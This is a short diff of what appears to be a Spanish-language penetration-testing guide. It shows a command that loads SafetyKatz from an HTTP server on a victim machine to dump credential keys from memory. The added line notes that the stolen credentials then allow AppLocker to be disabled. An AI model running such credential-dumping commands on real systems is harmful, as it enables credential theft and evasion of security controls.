@@ -395,3 +395,4 @@ Y en la maquina victima ejecutar el *SafetyKatz*
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
 ```
 
+Obteniendo las credenciales podremos ahora desactivar el *Applocker* lo cual no es una acion segura en un entorno controlado como un pentest pero los ciberdelincuentes si que abusan de ello bastante
